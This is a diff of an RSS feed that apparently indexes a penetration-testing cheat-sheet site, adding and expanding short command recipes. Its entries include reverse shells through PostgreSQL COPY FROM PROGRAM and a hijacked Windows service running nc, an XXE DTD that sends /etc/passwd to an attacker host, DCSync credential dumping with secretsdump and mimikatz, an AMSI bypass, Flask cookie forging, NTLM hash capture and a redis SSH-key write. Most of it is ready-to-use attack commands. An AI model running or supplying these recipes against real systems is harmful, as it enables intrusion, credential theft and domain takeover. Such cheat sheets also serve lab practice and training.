@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>AD Recycle Bin</title>
+      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
+      <description> AD Recycle Bin import-module activedirectory # Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects # Get all details for the deleted account (e.g. TempAdmin) Get-ADObject -filter { SAMAccountName -eq &amp;#34;TempAdmin&amp;#34; } -includeDeletedObjects -property * # Restore deleted account (Need to rename to avoid user exist) Restore-ADObject -Identity ObjectGUID -NewName &amp;#34;new_user&amp;#34; -TargetPath &amp;#34;CN=Users,DC=example,DC=com&amp;#34; </description>
+    </item>
+    <item>
       <title>Advance wget</title>
       <link>https://tldrbins.github.io/advance_wget/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -47,7 +54,14 @@
       <link>https://tldrbins.github.io/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/bloodhound/</guid>
-      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All </description>
+      <description> sharphound.ps1 Download sharphound.ps1&#xA;# Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All sharphound.exe .\SharpHound.exe -c all </description>
+    </item>
+    <item>
+      <title>Bypass ASMI</title>
+      <link>https://tldrbins.github.io/bypas_asmi/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/bypas_asmi/</guid>
+      <description>evil-winrm menu Bypass-4MSI Note: have to run menu first</description>
     </item>
     <item>
       <title>Compressed Files</title>
@@ -82,7 +96,7 @@
       <link>https://tldrbins.github.io/advance_curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # PUT a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx # POST a file with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; http://10.10.11.10/upload # POST a file in raw-text format (not as attachment) with form param `file` curl -X POST -F &amp;#39;file=&amp;lt;shell.</description>
+      <description>Advance curl # POST url-encoded data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # Put the POST data to url and use GET curl -G --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # PUT a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Put a file as raw binary format (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.</description>
     </item>
     <item>
       <title>Custom Word List Generator</title>
@@ -111,6 +125,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
       <description> Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root </description>
+    </item>
+    <item>
+      <title>Docker Registry</title>
+      <link>https://tldrbins.github.io/docker_registry/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/docker_registry/</guid>
+      <description> API # List repos curl -s -k --user &amp;#34;username:password&amp;#34; https://docker.example.com/v2/_catalog # List of tags of this repo curl -s -k --user &amp;#34;username:password&amp;#34; https://docker.example.com/v2/REPO_NAME/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;username:password&amp;#34; https://docker.example.com/v2/REPO_NAME/manifests/latest # Get a commit of the image curl -s -k --user &amp;#34;username:password&amp;#34; https://docker.example.com/v2/REPO_NAME/blobs/sha256:BLOB_HASH&amp;#39; </description>
     </item>
     <item>
       <title>dotnet</title>
@@ -197,6 +218,13 @@
       <description> Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; # Brute force secret key flask-unsign --unsign --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;#34;{&amp;#39;logged_in&amp;#39;: True, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;}&amp;#34; --secret &amp;#34;secret123&amp;#34; </description>
     </item>
     <item>
+      <title>Forward Shell</title>
+      <link>https://tldrbins.github.io/forward_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forward_shell/</guid>
+      <description> Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
+    </item>
+    <item>
       <title>FTP</title>
       <link>https://tldrbins.github.io/ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -204,18 +232,32 @@
       <description> Basic # Connect ftp 10.10.11.10 +-------------------+ |Anonymous login | +-------------------+ |Username: anonymous| |Password: (empty) | +-------------------+ # List ls # Switch to binary transfer mode bin # Download get filename # Upload put filename # Exit quit </description>
     </item>
     <item>
+      <title>GenericAll</title>
+      <link>https://tldrbins.github.io/genericall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericall/</guid>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Authenticated # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#34;Exchange Windows Permissions&amp;#34; -Members USER Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Add user to group (e.g. Exchange Windows Permissions) Add-DomainGroupMember -Identity &amp;#39;Exchange Windows Permissions&amp;#39; -Members USER -Credential $Cred </description>
+    </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description> Using PowerView.ps1 . .\PowerView.ps1 Add UF_DONT_REQUIRE_PREAUTH bit # Check target user Get-DomainUser user | ConvertFrom-UACValue Set-DomainObject -Identity user -XOR @{useraccountcontrol=4194304} -Verbose Get hash # In local linux machine impacket-GetNPUsers example.com/user -no-pass -dc-ip 10.10.11.10 </description>
+    </item>
+    <item>
       <title>GetChanges/GetChangesAll</title>
       <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
-      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 </description>
+      <description> GetChanges/GetChangesAll DCSync Attack (From Linux) # With creds impacket-secretsdump -just-dc username:password@10.10.11.10 # With hashes impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10 Mimikatz (From Windows) .\mimikatz.exe &amp;#39;lsadump::dcsync /domain:EXAMPLE.COM /user:administrator&amp;#39; exit </description>
     </item>
     <item>
       <title>git</title>
       <link>https://tldrbins.github.io/git/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/git/</guid>
-      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; git-dumper Download git-dumper&#xA;git-dumper http://10.</description>
+      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; SUDO # Copy target project cp -r /var/www/html/project .</description>
     </item>
     <item>
       <title>Graphql</title>
@@ -292,7 +334,7 @@
       <link>https://tldrbins.github.io/keepass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/keepass/</guid>
-      <description> kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 </description>
+      <description> Master password cracking keepass2john key.kdbx &amp;gt; hash # With a key file keepass2john -k key.png key.kdbx &amp;gt; hash kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # Open kdbx with a key file kpcli --key key.png --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 </description>
     </item>
     <item>
       <title>Kerberoasting</title>
@@ -313,7 +355,7 @@
       <link>https://tldrbins.github.io/ldap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ldap/</guid>
-      <description> Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap </description>
+      <description> Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;example.com\username&amp;#39; -p &amp;#39;passowrd&amp;#39; 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -h 10.10.11.10 -s base namingcontexts # Get info about domain ldapsearch -x -h 10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; # Just get a class (e.g. person) ldapsearch -x -h 10.10.11.10 -b &amp;#39;DC=EXAMPLE,DC=COM&amp;#39; &amp;#39;(objectClass=person)&amp;#39; </description>
     </item>
     <item>
       <title>Linux hard disk encryption</title>
@@ -404,7 +446,7 @@
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.</description>
+      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema SELECT table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table SELECT * from db_name.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
@@ -418,7 +460,7 @@
       <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
-      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
+      <description>Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or load_file(&amp;#39;\\10.10.14.10\any\thing&amp;#39;); Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
     </item>
     <item>
       <title>Mysql General</title>
@@ -439,7 +481,7 @@
       <link>https://tldrbins.github.io/nxc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nxc/</guid>
-      <description> nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash </description>
+      <description>nxc Download nxc&#xA;SMB # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash WINRM # Single user and password nxc winrm 10.</description>
     </item>
     <item>
       <title>Network Discovery</title>
@@ -544,7 +586,14 @@
       <link>https://tldrbins.github.io/postgresql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/postgresql/</guid>
-      <description> General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database Basic Commands # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Exit \q </description>
+      <description>General Connect to postgresql Database psql -h 127.0.0.1 -U user -p 5432 -d database Basic Commands # Show databases \list # Show tables in current database \dt # Dump data from table select * from table_name; # Insert data into table (e.g) insert into table_name (username, password, role) values (&amp;#39;user&amp;#39;, &amp;#39;password&amp;#39;, &amp;#39;admin&amp;#39;); # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM &amp;#39;nc -e /bin/bash 10.</description>
+    </item>
+    <item>
+      <title>Python Decompile</title>
+      <link>https://tldrbins.github.io/python_decompile/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/python_decompile/</guid>
+      <description> uncompyle6 # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc </description>
     </item>
     <item>
       <title>rbash</title>
@@ -558,14 +607,21 @@
       <link>https://tldrbins.github.io/redis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/redis/</guid>
-      <description> Arbitrary Write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.ssh/ redis-cli -h 127.0.0.1 config set dbfilename &amp;#34;authorized_keys&amp;#34; redis-cli -h 127.0.0.1 save </description>
+      <description>Basic Commands # Connect redis-cli -h 127.0.0.1 # List current keys keys * # Add key incr key # Get key value get key Arbitrary Write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.ssh/ redis-cli -h 127.</description>
     </item>
     <item>
       <title>RPC</title>
       <link>https://tldrbins.github.io/rpc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/rpc/</guid>
-      <description> RPC rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U domain/username 10.10.11.10 # Commands querydispinfo enumdomusers </description>
+      <description>RPC rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U domain/username%password 10.10.11.10 # Inline execute command rpcclient -U domain/username%password 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup RID # Query group member by rid querygroupmem RID # Query user by rid queryuser RID # Look up a user lookupnames USERNAME # Look up by SID lookupsids SID impacket-lookupsid impacket-lookupsid username:password@10.</description>
+    </item>
+    <item>
+      <title>rsync</title>
+      <link>https://tldrbins.github.io/rsync/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/rsync/</guid>
+      <description>Basic Commands # List directory (&amp;#39;/&amp;#39;) with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/ # List a file with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/passwd # List files (wildcard) with ipv6 rsync --list-only -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/rsync* # Get a file with ipv6 rsync -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/passwd . # Get files (wildcard) with ipv6 rsync -a rsync://[dead:beef::1234:5678:90ab:cdef]:8730/etc/rsync* . # Copy files recusively to remote (With Creds) export RSYNC_PASSWORD=password; rsync -aR .ssh/ rsync://user@[dead:beef::1234:5678:90ab:cdef]:8730/home_user/ Bruteforce rsync password # Check user from /etc/passwd, module from /etc/rsyncrsyncd.</description>
     </item>
     <item>
       <title>Runas</title>
@@ -586,7 +642,7 @@
       <link>https://tldrbins.github.io/secretsdump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secretsdump/</guid>
-      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL </description>
+      <description> Impacket Download Impacket&#xA;secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10 </description>
     </item>
     <item>
       <title>Secure String</title>
@@ -594,6 +650,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/secrue_string/</guid>
       <description> Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
+    </item>
+    <item>
+      <title>Server Operators</title>
+      <link>https://tldrbins.github.io/server_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/server_operators/</guid>
+      <description> Server Operators # Change a service path (e.g. browser) sc.exe config browser binPath= &amp;#34;C:\windows\tasks\nc.exe -e cmd.exe 10.10.14.10 443&amp;#34; # Stop service sc.exe stop browser # Start service sc.exe stop browser </description>
     </item>
     <item>
       <title>Shadow Hash Cracking</title>
@@ -715,6 +778,13 @@
       <description> davtest Download davtest&#xA;# Without creds davtest -url http://10.10.11.10 # With creds davtest -url http://10.10.11.10 -auth user:password curl # Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
     </item>
     <item>
+      <title>whois</title>
+      <link>https://tldrbins.github.io/whois/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/whois/</guid>
+      <description> WHOIS # General whois google.com # With specific server whois -h 10.10.11.10 -p 43 google.com </description>
+    </item>
+    <item>
       <title>Windows ACLs</title>
       <link>https://tldrbins.github.io/windows_acls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -736,11 +806,18 @@
       <description> Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo &amp;#39;user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash&amp;#39; &amp;gt;&amp;gt; /etc/passwd # Get root shell su - user </description>
     </item>
     <item>
+      <title>WriteDacl</title>
+      <link>https://tldrbins.github.io/writedacl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writedacl/</guid>
+      <description> Add dcsync right to user . .\PowerView.ps1 Authenticated Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Add-DomainObjectAcl -PrincipalIdentity &amp;#39;USER&amp;#39; -TargetIdentity &amp;#39;EXAMPLE.COM\Domain Admins&amp;#39; -Rights DCSync -Credential $Cred Dcsync attack impacket-secretsdump username:password@10.10.11.10 </description>
+    </item>
+    <item>
       <title>XXE (XML External Entity)</title>
       <link>https://tldrbins.github.io/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/xxe/</guid>
-      <description> XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
+      <description> XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; External DTD (2 stage) &amp;lt;!ENTITY % data SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt; &amp;lt;!ENTITY % eval &amp;#34;&amp;lt;!ENTITY exfil SYSTEM &amp;#39;http://10.10.14.10/data?%data;&amp;#39;&amp;gt;&amp;#34;&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % bar SYSTEM &amp;#34;http://10.10.14.10/evil.dtd&amp;#34;&amp;gt; %bar; %eval; ]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;exfil;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
     </item>
     <item>
       <title>Zabbix</title>
